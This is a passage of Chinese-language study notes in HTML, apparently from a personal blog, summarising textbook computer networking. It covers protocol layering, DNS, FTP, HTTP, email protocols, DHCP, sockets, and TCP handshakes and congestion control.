title="时延"></a>时延</h4><ul><li>传播时延：电磁波在信道中传输所需要的时间</li><li>处理时延：交换结点为存储转发而进行的一些必要的处理所花费的时间</li><li>排队时延：结点缓存队列中分组排队所经历的时延</li><li>发送时延</li></ul><h3 id="计算机网络的体系结构"><a href="#计算机网络的体系结构" class="headerlink" title="计算机网络的体系结构"></a>计算机网络的体系结构</h3><p>网络协议的组成要素：</p><ul><li>语法：数据与控制信息的结构或格式</li><li>语义：需要发出何种控制信息，完成何种动作以及做出何种响应</li><li>同步：事件实现顺序的详细说明</li></ul><p>划分层次的概念举例，比如两个主机交换文件：<br><img src="https://ae01.alicdn.com/kf/H9539432bfcff47198ad9d945aa786d65O.jpg" alt=""><br><img src="https://ae01.alicdn.com/kf/Hfba22743c8b44492b7f3542f4517f463P.jpg" alt=""><br><img src="https://ae01.alicdn.com/kf/H2b51176fec514eddbbcea9bc7dda6fd9p.jpg" alt=""></p><p>计算机网络的体系结构是计算机网络各层及其协议的集合。</p><h4 id="体系结构"><a href="#体系结构" class="headerlink" title="体系结构"></a>体系结构</h4><p>OSI七层：应用层、表示层、会话层、运输层、网络层、数据链路层、物理层<br>TCP/IP四层： 应用层、运输层、网际层、网络接口层<br>五层：应用层、运输层、网络层、数据链路层、物理层</p><h4 id="具有五层协议的结构体系结构"><a href="#具有五层协议的结构体系结构" class="headerlink" title="具有五层协议的结构体系结构"></a>具有五层协议的结构体系结构</h4><p><img src="https://ae01.alicdn.com/kf/H0e878df8c6ec4145b3af8b04ad9034a12.jpg" alt=""></p><ol><li>应用进程数据先传送到应用层，加上应用层首部，成为应用层PDU</li><li>应用层PDU再传送到运输层，加上运输层首部，成为运输层报文</li><li>运输层报文再传送到网络层，加上网络层首部，成为数据报</li><li>数据报再传送到数据链路层，加上链路层首部和尾部，成为数据链路层帧</li><li>数据链路层帧再传送到物理层，最下面的物理层把比特流传送到物理媒体</li><li>电信号(或光信号)在物理媒体中传播从发送端物理层传送到接收端物理层。</li><li>接收端收到数据后采用上述逆序层层剥离首部，直到最终应用进程接收到原始数据。</li></ol><h5 id="实体、协议、服务和服务访问点"><a href="#实体、协议、服务和服务访问点" class="headerlink" title="实体、协议、服务和服务访问点"></a>实体、协议、服务和服务访问点</h5><ul><li>实体：表示任何可发送或接收信息的硬件或软件进程</li><li>协议：控制两个对等实体进行通信的规则集合</li><li>在协议的控制下，两个对等实体间的通信使得本层能够向上一层提供服务</li><li>要实现本层协议，还需要使用下层所提供的服务</li><li>本层的服务用户只能看见服务而无法看见协议</li><li>协议是水平的，即协议是控制对等实体之间的通信规则</li><li>服务是垂直的，即服务是由下层向上层通过层间接口提供的。</li><li>同一系统相邻两层的实体进行交互的地方，称为服务访问点SAP(Service Access Point)</li></ul><h5 id="路由器转发分组"><a href="#路由器转发分组" class="headerlink" title="路由器转发分组"></a>路由器转发分组</h5><p><img src="https://ae01.alicdn.com/kf/He368fb0fb663446b8f26b4d836219fdb9.jpg" alt=""></p><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><ul><li>每个应用层协议都是为了解决某一类应用问题</li><li>应用层许多协议都是基于客户-服务器方式</li></ul><h3 id="域名系统DNS"><a href="#域名系统DNS" class="headerlink" title="域名系统DNS"></a>域名系统DNS</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><ul><li>因特网采用层次结构的命名树作为主机的名字，并采用分布式的域名命名系统(Domain Name System,DNS)。</li><li>主机名到IP地址的解析都是由若干个域名服务器程序完成的，域名服务器程序在专设的结点上运行，运行该程序的机器称为域名服务器。</li></ul><blockquote><p>注：DNS采用UDP传输机制</p></blockquote><h4 id="因特网的域名结构"><a href="#因特网的域名结构" class="headerlink" title="因特网的域名结构"></a>因特网的域名结构</h4><p>任何一个连接在因特网上的主机或路由器，都有一个唯一的层次结构的名字，即域名。域名的结构由标号序列组成，各标点之间用点隔开：</p><pre class=" language-bash"><code class="language-bash">xx.三级域名.二级域名.顶级域名</code></pre><p>各标号代表不同级别的域名</p><h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><p>域名只是个逻辑概念，并不代表计算机所在的物理地点。域名是为了让人类方便记忆，而IP地址是为了让机器进行处理。</p><ol><li>顶级域名TLD(Top Levl Domain):国家顶级域名、通用顶级域名、基础结构域名<br><img src="https://ae01.alicdn.com/kf/H117e52f3ca4e4bb1a6f36ce92a4755b47.jpg" alt=""></li></ol><h5 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h5><ul><li>一个服务器所负责管辖的(或有权限的)范围叫做区(zone).</li><li>一个区中的所有结点必须是能够连通的</li><li>每一个区设置相应的权限域名服务器，用来保存该区中的所有主机的域名到IP地址的映射</li><li>DNS服务器的管辖范围不是以域为单位，而是以区为单位。</li></ul><p>下图是区的不同划分方法举例：<br><img src="https://ae01.alicdn.com/kf/H7e38244286694fc893b294fe92a2ab1dO.jpg" alt=""></p><p>下图是树状结构的DNS域名服务器：<br><img src="https://ae01.alicdn.com/kf/H568d287cdc8e48dda2906f093bd5b608w.jpg" alt=""></p><p>从上图可知，域名服务器有以下4种类型：</p><ol><li>根域名服务器：</li></ol><ul><li>所有的根域名服务器都知道所有顶级域名服务器的域名和IP地址</li><li>不管是哪一个本地域名服务器，只要自己无法解析，首先求助于根域名服务器</li><li>在因特网上共有13个根域名服务器(从a-m)</li></ul><ol start="2"><li>顶级域名服务器(TLD服务器)：</li></ol><ul><li>负责管理在该顶级域名服务器注册的所有二级域名</li></ul><ol start="3"><li>权限域名服务器：</li></ol><ul><li>当一个权限域名服务器不能给出最后的查询回答时，会告诉发出查询请求的DNS客户，下一步应当找哪个权限域名服务器</li></ul><ol start="4"><li>本地域名服务器(默认域名服务器)：</li></ol><ul><li>当一个主机发出DNS查询请求时，这个查询报文首先发送给本地域名服务器</li><li>每个因特网服务提供者ISP，都可以拥有一个本地域名服务器</li></ul><h4 id="域名解析过程"><a href="#域名解析过程" class="headerlink" title="域名解析过程"></a>域名解析过程</h4><ul><li>主机向本地域名服务器查询一般是采用递归查询。</li><li>本地域名服务器向根域名服务器的查询通常是采用迭代查询。<br><img src="https://ae01.alicdn.com/kf/Hc51af157a30e453496a2c86a4adf6d143.jpg" alt=""></li></ul><h3 id="文件传送协议"><a href="#文件传送协议" class="headerlink" title="文件传送协议"></a>文件传送协议</h3><h4 id="FTP的概述"><a href="#FTP的概述" class="headerlink" title="FTP的概述"></a>FTP的概述</h4><ul><li>文件传送协议FTP(File Transfer Protocol)是因特网上使用最广泛的文件传送协议</li><li>FTP提供交互式的访问，允许客户指明文件的类型与格式，并允许文件具有存取权限。</li></ul><h5 id="FTP的基本工作原理"><a href="#FTP的基本工作原理" class="headerlink" title="FTP的基本工作原理"></a>FTP的基本工作原理</h5><ol><li>FTP的特点</li></ol><ul><li>FTP只提供文件传送的一些基本的服务，它使用TCP可靠的运输服务</li><li>FTP使用客户-服务器方式。</li><li>一个FTP的服务器进程由两大部分组成：一个主进程，负责接收新的请求。一个从属进程，负责处理单个请求。</li></ul><ol start="2"><li>两个连接<br>FTP在工作过程中会打开两个TCP连接：</li></ol><ul><li>控制连接：用来控制进程。在整个会话期间一直保持打开，FTP客户发出的传送请求通过控制连接发送给服务器端的控制进程，控制连接不用来传送文件。(端口号21)</li><li>数据连接：用来传输文件(端口号20)</li></ul><h4 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h4><ul><li>NFS采用另一种思路，它允许应用程序打开一个远程文件，并能在该文件的某一个特定位置上开始读写数据。</li><li>NFS可使用户只复制一个文件中的一个很小的片断，而不需要复制整个大文件</li><li>在网络上传送的只是少量的修改数据</li></ul><h4 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h4><p>简单文件传送协议TFTP(Trivial File Transfer Protocol):</p><ul><li>TFTP使用客户-服务器方式。并使用UDP数据报。</li><li>TFTP只支持文件传输而不支持交互</li><li>支持ASCII码或二进制传送</li></ul><h3 id="远程终端协议TELNET"><a href="#远程终端协议TELNET" class="headerlink" title="远程终端协议TELNET"></a>远程终端协议TELNET</h3><ul><li>TELNET是一个简单的远程终端协议，也是因特网的正式标准</li><li>用户用TELNET就可在所在地通过TCP连接注册(登录)到远程的另一个主机上(使用主机名或IP地址)</li><li>TELNET能够将用户的击键传到远程主机，同时也能将远程主机的输出通过TCP连接返回到用户屏幕。</li><li>TELNET使用客户-服务器方式</li></ul><h4 id="网络虚拟终端NVT"><a href="#网络虚拟终端NVT" class="headerlink" title="网络虚拟终端NVT"></a>网络虚拟终端NVT</h4><p>网络虚拟终端（NVT）是一种虚拟的终端设备，它被客户和服务器所采用，用来建立数据表示和解释的一致性。</p><p>TELNET使用网络虚拟终端NVT格式</p><ul><li>客户软件把用户的击键的和命令转换成NVT格式并交给服务器</li><li>服务器软件把收到的数据和命令，从NVT格式转换成远程系统所需要的格式</li><li>向用户返回数据时，服务器把远程系统的格式转换为NVT，本地客户再从NVT格式转换到本地系统所需的格式</li></ul><h3 id="万维网WWW"><a href="#万维网WWW" class="headerlink" title="万维网WWW"></a>万维网WWW</h3><ul><li>万维网WWW(World Wide Web)并非某种特殊的计算机网络</li><li>万维网是一个大规模的、联机式的信息储藏所</li><li>万维网用链接的方法能非常方便地从因特网上的一个站点访问另一个站点，这种方式被称为”链接”</li></ul><h4 id="万维网提供分布式服务"><a href="#万维网提供分布式服务" class="headerlink" title="万维网提供分布式服务"></a>万维网提供分布式服务</h4><p><img src="https://ae01.alicdn.com/kf/He55e6d822da541f58c2ec5728ae23c54H.jpg" alt=""></p><h5 id="超媒体和超文本"><a href="#超媒体和超文本" class="headerlink" title="超媒体和超文本"></a>超媒体和超文本</h5><p>万维网是分布式超媒体(hypermedia)系统，它是超文本(hypertext)系统的扩充</p><ul><li>超文本：一个超文本由多个信息源链接成，利用一个链接可使用户找到另一个文档，这些文档可以位于世界上任何一个接在因特网上的超文本系统中，超文本是万维网的基础</li><li>超媒体：超媒体与超文本的区别是文档内容不同。超文本文档仅包含文本信息，而超媒体文档还包含其他表示方式的信息，如图形、视频、声音等。</li></ul><h4 id="万维网的工作方式"><a href="#万维网的工作方式" class="headerlink" title="万维网的工作方式"></a>万维网的工作方式</h4><ul><li>万维网以客户-服务器方式工作</li><li>浏览器就是用户计算机上的万维网客户程序，万维网文档所驻留的计算机则运行服务器程序，因此这个计算机也被称为万维网服务器</li><li>客户程序向服务器程序发出请求，服务器程序向客户程序送回客户所要的万维网文档</li><li>在一个客户程序主程序窗口上显示出的万维网文档称为页面。</li></ul><h4 id="万维网实现的功能"><a href="#万维网实现的功能" class="headerlink" title="万维网实现的功能"></a>万维网实现的功能</h4><h5 id="标记万维网文档"><a href="#标记万维网文档" class="headerlink" title="标记万维网文档"></a>标记万维网文档</h5><ul><li>使用统一资源定位符URL(Uniform Resource Locator)来标记万维网上的各种文档</li><li>使每一个文档在整个因特网的范围内具有唯一的标识符URL</li></ul><h5 id="实现超链的链接"><a href="#实现超链的链接" class="headerlink" title="实现超链的链接"></a>实现超链的链接</h5><ul><li>在万维网客户程序与服务器程序之间进行交互所使用的协议，是超文本传送协议HTTP(HyperText Transfer Protocol)</li><li>HTTP是一个应用层协议，它使用TCP连接进行可靠的传送</li></ul><h5 id="显示万维网文档"><a href="#显示万维网文档" class="headerlink" title="显示万维网文档"></a>显示万维网文档</h5><p>使用超文本标记语言HTML(HyperTexgt Markup Language)显示文档内容</p><h5 id="查找信息"><a href="#查找信息" class="headerlink" title="查找信息"></a>查找信息</h5><p>可以使用搜索引擎在万维网上查找信息</p><h3 id="统一资源定位符URL"><a href="#统一资源定位符URL" class="headerlink" title="统一资源定位符URL"></a>统一资源定位符URL</h3><p>URL是对可以从因特网上得到的资源的位置和访问方法的一种表示。它相当于一个文件名在网络范围的扩展，因此，URL是与因特网相连的机器上的任何可访问对象的一个指针。</p><h4 id="URL的一般格式"><a href="#URL的一般格式" class="headerlink" title="URL的一般格式"></a>URL的一般格式</h4><p><img src="https://ae01.alicdn.com/kf/H9ca848614d084d87b1f25651ea0c72511.jpg" alt=""></p><ul><li>主机:是存放资源的主机在因特网中的域名</li><li>端口和路径有时可省略，若路径省略则URL会指到因特网上的某个主页</li></ul><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><h4 id="HTTP的操作过程"><a href="#HTTP的操作过程" class="headerlink" title="HTTP的操作过程"></a>HTTP的操作过程</h4><p><img src="https://ae01.alicdn.com/kf/Ha24da11f52a147dd9b9dbc362b908ed2m.jpg" alt=""><br>用户点击鼠标后发生的事件</p><ol><li>浏览器分析超链指向页面的URL</li><li>浏览器向DNS请求解析<a href="http://www.tsinghua.edu.cn" target="_blank" rel="noopener">www.tsinghua.edu.cn</a> 的IP地址</li><li>DNS解析出清华大学服务器的IP地址</li><li>浏览器与服务器建立TCP连接</li><li>浏览器发出取文件命令：<pre class=" language-bash"><code class="language-bash">GET xxxx/index.html</code></pre></li><li>服务器给出响应，把文件Index.html发给浏览器：<pre class=" language-bash"><code class="language-bash">HTTP/1.0 200 OKXXX</code></pre></li><li>TCP连接释放</li><li>浏览器显示index.html中的所有文本。</li></ol><h4 id="HTTP的特点"><a href="#HTTP的特点" class="headerlink" title="HTTP的特点"></a>HTTP的特点</h4><ul><li>HTTP是面向事务的客户服务器协议</li><li>HTTP 协议是无状态、无连接的</li></ul><h5 id="非持续连接和持续连接"><a href="#非持续连接和持续连接" class="headerlink" title="非持续连接和持续连接"></a>非持续连接和持续连接</h5><ul><li>非持续连接(non-persistent connection)：每个请求/响应对是经一个单独的TCP连接发送</li><li>持续连接(persisitent connection):所有请求和响应都是经过相同的TCP连接发送的</li></ul><p>非持续连接HTTP：<br>在非持续连接的情况下，从服务器向客户传送一个Web页面的步骤，假设页面上含有一个HTML基本文件和10个JPEG文件，并且这11个对象位于同一台服务器上。该HTML文件的URL为:<a href="http://www.test.com/some/home.index" target="_blank" rel="noopener">http://www.test.com/some/home.index</a> ，我们看看会发生什么：</p><ol><li>HTTP客户进程在端口号80(HTTP默认端口)发起一个到服务器<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a> 的TCP连接，在客户和服务器上分别有一个套接字与该连接相关联。</li><li>HTTP客户经它的套接字向该服务器发送一个HTTP请求报文，请求报文包含了路径名/some/home.index。</li><li>HTTP服务器通过它的套接字接收该请求报文，从它的存储器(RAM或磁盘)中检索对象<a href="http://www.test.com/some/home.index" target="_blank" rel="noopener">www.test.com/some/home.index</a> ,在一个HTTP响应中封装该对象，并通过套接字向客户发送响应报文。</li><li>HTTP服务器进程通知TCP断开该连接。(但是直到TCP确认客户以及完整地收到响应报文为止，它才会实际中断连接)</li><li>HTTP客户接收响应报文，TCP连接关闭。该报文指出封装的对象是一个HTML文件，客户从响应中提取出该文件，检查出HTML文件，得到对应的10个JPEG图形的引用</li><li>对每个引用的JPEG图形对象重复前4个步骤。<br>当浏览器收到Web页面后，显示给用户，两个不同的浏览器会以不同的方式解释(即向用户展示)该页面</li></ol><p>采用持续连接的HTTP<br>上述的过程中的一个完整的Web页面可以用单个持续TCP连接进行传送。</p><h4 id="HTTP报文格式"><a href="#HTTP报文格式" class="headerlink" title="HTTP报文格式"></a>HTTP报文格式</h4><p>请参阅Web安全(2)</p><h4 id="Web缓存"><a href="#Web缓存" class="headerlink" title="Web缓存"></a>Web缓存</h4><p>Web缓存器(Web cache)也叫代理服务器(proxy server),它是能够代表初始Web服务器来满足HTTP请求的网络实体。Web缓存器有自己的磁盘存储空间，并在存储空间保存最近请求过的对象的副本。举例来说，假定服务器正在请求对象<a href="http://www.test.com/hello.gif" target="_blank" rel="noopener">http://www.test.com/hello.gif</a> 就会发生如下情况：</p><ol><li>浏览器创建一个到Web缓存器的TCP连接，并向Web缓存器中的对象发送一个HTTP请求</li><li>Web缓存器进行检查，查看本地是否存储了该对象的副本。如果有，Web缓存器就向客户浏览器用HTTP响应报文返回该对象</li><li>如果Web缓存器中没有该对象，它就打开一个与该对象的初始服务器(<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a> )的TCP连接，Web缓存器在这个缓存器到服务器的TCP连接上发送一个对该对象的HTTP请求，在收到该请求后，初始服务器向Web缓存器发送具有该对象的HTTP响应。</li><li>当Web缓存器收到该对象时，它在本地空间存储一份副本，并向客户的浏览器用HTTP响应报文发送该副本。<br>在这个过程中，Web缓存器既是服务器同时又是客户。<br>Web缓存器通常由ISP购买并安装。</li></ol><h4 id="Cookie机制"><a href="#Cookie机制" class="headerlink" title="Cookie机制"></a>Cookie机制</h4><ul><li>万维网站点使用cookie来跟踪用户</li><li>cookie表示HTTP服务器和客户之间传递的状态信息</li><li>使用cookie的网站服务器为用户产生一个唯一的识别码。利用此识别码网站就能追踪该用户在该网站的活动。</li></ul><h3 id="万维网文档"><a href="#万维网文档" class="headerlink" title="万维网文档"></a>万维网文档</h3><p>万维网文档分为静态文档和动态文档</p><ul><li>静态文档：在文档创作完毕后就存放在万维网服务器中，在被用户浏览的过程中，内容不会改变</li><li>动态文档：文档内容是在浏览器访问万维网服务器时才由应用程序动态创建</li><li>动态文档和静态文档之间的主要差别体现在服务器一端，这主要是文档内容的生成方法不同，而从浏览器的角度看，这两种文档并没有区别</li></ul><h4 id="通用网关接口CGI"><a href="#通用网关接口CGI" class="headerlink" title="通用网关接口CGI"></a>通用网关接口CGI</h4><p>CGI是一种标准，它定义了动态文档应如何创建，输入数据应如何提供给应用程序，以及输出的结果应如何使用。</p><ul><li>通用：CGI标准所定义的规则对所有语言通用。</li><li>网关：CGI程序的作用像网关</li><li>接口：有一些已定义好的变量和调用等可供其他CGI程序使用。</li></ul><h4 id="活动万维网文档"><a href="#活动万维网文档" class="headerlink" title="活动万维网文档"></a>活动万维网文档</h4><p>每当浏览器请求一个活动文档时，服务器就返回一段程序副本在浏览器端运行。活动文档程序可与用户直接交互，并可连续地改变屏幕显示。</p><h3 id="浏览器的主要组成"><a href="#浏览器的主要组成" class="headerlink" title="浏览器的主要组成"></a>浏览器的主要组成</h3><p>浏览器有一组客户、一组解释程序以及管理这些客户和解释程序的控制程序</p><ul><li>控制程序是其中的核心部件，它解释鼠标的点击和键盘的输入，并调用有关的组件来执行用户指定的操作</li><li>解释程序：HTML解释程序是必不可少的，而其他解释程序是可选的。</li></ul><h2 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h2><p>###　电子邮件的标准</p><ul><li>发送邮件的协议：SMTP</li><li>读取邮件的协议：POP3、IMAP</li><li>MIME在其邮件首部中说明了邮件的数据类型(如文本、剩余、图像等)，使用MIME可在邮件中同时传送多种类型的数据</li></ul><p>下图显示了电子邮件的发送过程：<br><img src="https://ae01.alicdn.com/kf/H48f115693e6e4eedb67aa1ce61ed1ea8o.jpg" alt=""></p><h4 id="用户代理UA"><a href="#用户代理UA" class="headerlink" title="用户代理UA"></a>用户代理UA</h4><ul><li>用户代理UA(User Agent)就是用户与电子邮件系统的接口，是电子邮件客户端软件</li><li>用户代理的功能：撰写、显示、处理和通信</li></ul><h4 id="邮件服务器"><a href="#邮件服务器" class="headerlink" title="邮件服务器"></a>邮件服务器</h4><ul><li>邮件服务器的功能是发送和接收邮件，同时还要向发信人报告邮件传送的情况。</li><li>邮件服务器按照客户服务器方式工作，邮件服务器需要读取和发送两个不同的协议。</li><li>一个邮件服务器既可以作为客户，也可以作为服务器。</li></ul><h4 id="发送电子邮件的几个重要步骤"><a href="#发送电子邮件的几个重要步骤" class="headerlink" title="发送电子邮件的几个重要步骤"></a>发送电子邮件的几个重要步骤</h4><ol><li>发件人调用PC机中的用户代理撰写和编辑要发送的邮件</li><li>发件人的用户代理把邮件用SMTP协议发送给发送方的邮件服务器</li><li>SMTP服务器把邮件临时存放在邮件缓存队列中，等待发送</li><li>发送方邮件服务器的STMP客户与接受方邮件服务器的SMTP服务器建立TCP连接，然后把邮件缓存队列中的邮件依次发送出去</li><li>运行在接收方的邮件服务器中的SMTP服务器进程收到邮件后，把邮件放入收件人的用户邮箱中，等待收件人读取</li><li>收件人在打算收信时，就运行PC机中的用户代理，使用POP3(或IMAP)协议读取发送给自己的邮件</li></ol><h4 id="电子邮件地址的格式"><a href="#电子邮件地址的格式" class="headerlink" title="电子邮件地址的格式"></a>电子邮件地址的格式</h4><p>TCP/IP体系的电子邮件系统规定电子邮件地址的格式如下：</p><pre class=" language-bash"><code class="language-bash">收件人邮箱名@邮箱所在主机的域名fightingtree@neu.org.cn</code></pre><h3 id="简单邮件传送协议SMTP"><a href="#简单邮件传送协议SMTP" class="headerlink" title="简单邮件传送协议SMTP"></a>简单邮件传送协议SMTP</h3><p>SMTP(Simple Mail Transfer Protocol)所规定的就是在两个互相通信的SMTP进程之间应如何交换信息。</p><h4 id="SMTP通信的三个阶段"><a href="#SMTP通信的三个阶段" class="headerlink" title="SMTP通信的三个阶段"></a>SMTP通信的三个阶段</h4><ol><li>连接建立：连接是在发送主机的SMTP客户和接收主机的SMTP服务器之间建立的，SMTP不使用中间的邮件服务器</li><li>邮件传送</li><li>连接释放：邮件发送完毕后，SMTP应释放TCP连接</li></ol><h3 id="基于万维网的电子邮件"><a href="#基于万维网的电子邮件" class="headerlink" title="基于万维网的电子邮件"></a>基于万维网的电子邮件</h3><ul><li>使用这种服务，用户代理就是普通的浏览器，用户和他远程邮箱的通信都是通过HTTP进行。</li><li>用户访问他自己邮箱中的邮件使用的也是HTTP协议而不是POP3或IMAP协议。</li><li>当发件人要发送一封电子邮件时，该电子邮件报文从发件人的浏览器发送到她的邮件服务器，使用的是HTTP而不是SMTP协议。但是，发件人的邮件服务器与其他邮件的服务器之间发送和接收邮件时，使用的仍然是SMTP协议。</li></ul><h3 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a>动态主机配置协议DHCP</h3><p>动态主机配置协议DHCP(Dynamic Host Configuration Protocol)提供了即插即用连网(plug-and-play networking)的机制。<br>这种机制允许一台计算机加入新的网络和获取IP地址而不用手工参与。</p><h4 id="DHCP的工作原理"><a href="#DHCP的工作原理" class="headerlink" title="DHCP的工作原理"></a>DHCP的工作原理</h4><ol><li>需要IP地址的主机在启动时向DHCP服务器广播发送发现报文(DHCPDISCOVER),此时该主机成为DHCP客户</li><li>本地网络上的所有主机都能收到此广播报文，但只有DHCP服务器才能回答此广播报文。</li><li>DHCP服务器先在其数据库中查找该计算机的配置信息，若找到，则返回找到的信息，若找不到，则从服务器的IP地址池中取一个地址分配给该计算机。DHCP的回答报文叫做提供报文(DHCPOFFER)</li><li>DHCP服务器分配给DHCP客户的IP地址是临时的，因此DHCP客户只能在一段有限的时间内使用这个IP地址，DHCP协议称这段时间为租用期。</li></ol><h5 id="DHCP中继代理"><a href="#DHCP中继代理" class="headerlink" title="DHCP中继代理"></a>DHCP中继代理</h5><p>并不是每个网络都有DHCP服务器，但是每个网络至少有一个DHCP中继代理，它配置了DHCP服务器的IP地址信息。DHCP中继代理以单播的方式转发发现报文。</p><blockquote><p>注：DHCP报文只是UDP用户数据报中的数据。</p></blockquote><h2 id="应用进程跨域网络的通信"><a href="#应用进程跨域网络的通信" class="headerlink" title="应用进程跨域网络的通信"></a>应用进程跨域网络的通信</h2><h3 id="系统调用和应用编程接口"><a href="#系统调用和应用编程接口" class="headerlink" title="系统调用和应用编程接口"></a>系统调用和应用编程接口</h3><p>大多数操作系统使用系统调用的机制在应用程序和操作系统之间传递控制权。</p><h3 id="应用编程接口API"><a href="#应用编程接口API" class="headerlink" title="应用编程接口API"></a>应用编程接口API</h3><ul><li>当某个应用进程启动系统调用时，控制权就从应用进程传递给了系统调用接口。</li><li>此接口再将控制权传递给计算机的操作系统，操作系统将此调用转给某个内部过程，并执行所请求的操作。</li><li>内部过程一旦执行完毕，控制权就又通过系统调用接口返回给应用进程</li><li>系统调用接口实际上就是应用进程的控制权和操作系统的控制权进行转换的一个接口</li></ul><h3 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h3><p><img src="https://ae01.alicdn.com/kf/H372bf7ed5f7941a48af316fa14e3d844c.jpg" alt=""><br>套接字的作用：</p><ul><li>当进程需要使用网络进行通信时就发出系统调用，请求操作系统为其创建“套接字”，以便把网络通信所需要的系统资源分配给应用进程</li><li>操作系统为这些的资源的总和用一个叫做套接字描述符的号码来表示，并把此号码返回给应用进程。应用进程所进行的网络操作都必须使用这个号码</li><li>通信完毕后，应用进程通过一个关闭套接字的系统调用通知操作系统回收与该“号码”相关的所有资源。</li></ul><h4 id="多路复用和多路分解"><a href="#多路复用和多路分解" class="headerlink" title="多路复用和多路分解"></a>多路复用和多路分解</h4><p>一个进程有一个或多个套接字(socket)，它相当于从网络向进程传递数据和从进程向网络传递数据的门户。因此，运输层实际上并没有直接将数据交付给进程，而是将数据交给了中间的套接字。在任意时刻，主机都可能有不止一个套接字，所以每个套接字都有唯一的标识符。标识符的格式取决于它是TCP还是UDP套接字。</p><ul><li>将运输层报文段中的数据交付到正确的套接字的工作称为多路分解(demultiplexing)</li><li>在源主机从不同套接字中收集数据块，并为每个数据块封装上首部信息从而生成报文段，然后将报文段传递到网络层，所有这些工作称为多路复用(multiplexing)</li></ul><h2 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a>运输层</h2><h3 id="运输层协议概述"><a href="#运输层协议概述" class="headerlink" title="运输层协议概述"></a>运输层协议概述</h3><h4 id="进程间的通信"><a href="#进程间的通信" class="headerlink" title="进程间的通信"></a>进程间的通信</h4><ul><li>运输层向它上面的应用层提供通信服务，它属于面向通信部分的最高层，同时也是用户功能中的最低层。</li><li>当网络的边缘部分有两个主机使用网络的核心部分功能进行端到端的通信时，只有位于网络边缘部分的主机的协议栈才有运输层，而网络核心部分路由器在转发分组时都只用到下三层的功能。(物理层、数据链路层、网络层)</li><li>两个主机进行通信实际上就是两个主机中的应用进程互相通信</li><li>应用进程之间的通信又称为端到端的通信。</li><li>运输层一个很重要的功能就是复用和分用。应用层不同进程的报文就是通过不同的端口向下交到运输层，再往下就共用网络层提供的服务。</li></ul><h4 id="运输层协议和网络层协议的主要区别"><a href="#运输层协议和网络层协议的主要区别" class="headerlink" title="运输层协议和网络层协议的主要区别"></a>运输层协议和网络层协议的主要区别</h4><p><img src="https://ae01.alicdn.com/kf/H0759bb34360d4d20a8a403ae7eb41a05S.jpg" alt=""></p><h4 id="运输层的主要功能"><a href="#运输层的主要功能" class="headerlink" title="运输层的主要功能"></a>运输层的主要功能</h4><ul><li>运输层为应用进程之间提供端到端的逻辑通信(但网络层视为主机之间提供逻辑通信)</li><li>运输层对收到的报文进行差错检测</li><li>运输层有两种不同的运输协议：面向连接的TCP和无连接的UDP</li></ul><h3 id="TCP和UDP"><a href="#TCP和UDP" class="headerlink" title="TCP和UDP"></a>TCP和UDP</h3><h4 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h4><p><img src="https://pic1.superbed.cn/item/5df514cda4fbc8614a6449f6.jpg" alt=""><br>三次握手的目的：为了防止已失效的链接请求报文突然又传送到了服务端，因而产生错误。</p><h4 id="TCP四次挥手"><a href="#TCP四次挥手" class="headerlink" title="TCP四次挥手"></a>TCP四次挥手</h4><p><img src="https://pic1.superbed.cn/item/5df58d86a4fbc8614a7857ff.jpg" alt=""><br>四次挥手的目的：AB发生数据，如果A向B发送FIN数据包，B收到后向A发送ACK数据包，A就不会再向B发送数据包，但此时AB的TCP连接处于半关闭状态，B仍然能够向A发送数据包，因此B也要对A发送FIN数据包，从而双向关闭TCP连接。</p><h4 id="TCP服务"><a href="#TCP服务" class="headerlink" title="TCP服务"></a>TCP服务</h4><p>TCP服务模型包括面向连接服务和可靠数据传输服务，当某个应用程序调用TCP作为传输协议时，该应用程序就能获得来自TCP的这两种服务。TCP应用层能够通过安全套接字SSL(Secure Socket Layer)来加强以提供安全服务。</p><ul><li>面向连接的服务：TCP三次握手使它们在大量分组的到来之前做好准备。在握手阶段后，一个TCP连接就在两个进程的套接字之间建立了。这条连接是全双工的，当应用程序结束报文发送时，必须拆除该连接。</li><li>可靠的数据传送服务：通信进程能够依靠TCP。无差错、按适当顺序交付所有发送的数据。当应用程序的一端将字节流传送进套接字时，它能够依靠TCP将相同的字节流交付给接收方的套接字，而没有字节的丢失和冗余。</li></ul><p>TCP还具有拥塞机制，当发送方和接收方之间的网络出现拥塞时，TCP的拥塞控制机制会抑制发送进程(客户或服务器)。</p><h5 id="TCP拥塞机制"><a href="#TCP拥塞机制" class="headerlink" title="TCP拥塞机制"></a>TCP拥塞机制</h5><ul><li>慢启动：不要一开始就发送大量的数据，先探测一下网络的拥塞程度，也就是说由小到大逐渐增加拥塞窗口的大小;</li><li>拥塞避免：拥塞避免算法让拥塞窗口缓慢增长，即每经过一个往返时间RTT就把发送方的拥塞窗口cwnd加1，而不是加倍，这样拥塞窗口按线性规律缓慢增长。</li><li>快重传：快重传要求接收方在收到一个失序的报文段后就立即发出重复确认（为的是使发送方及早知道有报文段没有到达对方）而不要等到自己发送数据时捎带确认。快重传算法规定，发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段，而不必继续等待设置的重传计时器时间到期。</li><li>快恢复：快重传配合使用的还有快恢复算法，当发送方连续收到三个重复确认时，就执行“乘法减小”算法，把ssthresh门限减半，但是接下去并不执行慢开始算法：因为如果网络出现拥塞的话就不会收到好几个重复的确认，所以发送方现在认为网络可能没有出现拥塞。所以此时不执行慢开始算法，而是将cwnd设置为ssthresh的大小，然后执行拥塞避免算法。</li></ul><h5 id="TCP保证传输可靠性的方法"><a href="#TCP保证传输可靠性的方法" class="headerlink" 